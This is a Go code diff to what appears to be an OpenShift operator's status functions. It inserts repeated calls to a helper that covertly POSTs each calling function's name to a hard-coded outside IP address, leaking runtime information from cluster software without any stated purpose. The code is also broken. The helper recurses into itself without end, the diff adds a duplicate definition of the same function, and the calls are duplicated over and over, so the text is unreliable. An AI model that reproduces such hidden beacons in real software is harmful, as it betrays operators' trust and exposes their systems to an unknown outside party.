@@ -22,6 +22,8 @@ import (
 func (r *ReconcileTuned) syncOperatorStatus() (bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var requeue bool
 	glog.V(1).Infof("syncOperatorStatus()")
 	coState, err := r.getOrCreateOperatorStatus()
@@ -53,6 +55,8 @@ func (r *ReconcileTuned) syncOperatorStatus() (bool, error) {
 func (r *ReconcileTuned) getOrCreateOperatorStatus() (*configv1.ClusterOperator, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var err error
 	clusterOperatorName := ntoconfig.OperatorName()
 	co := &configv1.ClusterOperator{TypeMeta: metav1.TypeMeta{Kind: "ClusterOperator", APIVersion: "config.openshift.io/v1"}, ObjectMeta: metav1.ObjectMeta{Name: clusterOperatorName}}
@@ -77,6 +81,8 @@ func (r *ReconcileTuned) getOrCreateOperatorStatus() (*configv1.ClusterOperator,
 	return coGet, nil
 }
 func computeStatusConditions(conditions []configv1.ClusterOperatorStatusCondition, daemonset *appsv1.DaemonSet, dsErr error) ([]configv1.ClusterOperatorStatusCondition, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var requeue bool
@@ -131,7 +137,16 @@ func computeStatusConditions(conditions []configv1.ClusterOperatorStatusConditio
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
